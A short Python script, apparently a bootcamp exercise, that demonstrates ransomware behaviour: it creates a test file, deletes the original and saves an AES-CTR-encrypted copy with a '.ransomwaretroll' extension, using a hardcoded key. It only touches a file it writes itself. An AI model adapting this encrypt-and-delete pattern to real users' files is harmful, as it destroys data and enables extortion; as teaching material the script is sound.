import os
import pyaes

def encrypt_file(file_name, key):
    # Criar o arquivo com o conteúdo especificado
    with open(file_name, "w") as file:
        file.write("Bootcamp Santander Desafio")

    with open(file_name, "rb") as file:
        file_data = file.read()

    os.remove(file_name)

    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    new_file_name = file_name + ".ransomwaretroll"
    with open(new_file_name, "wb") as new_file:
        new_file.write(crypto_data)

    print(f"Arquivo criptografado salvo como: {new_file_name}")

if __name__ == "__main__":
    key = b"testeransomwares"
    file_name = "teste.txt"  

    encrypt_file(file_name, key)
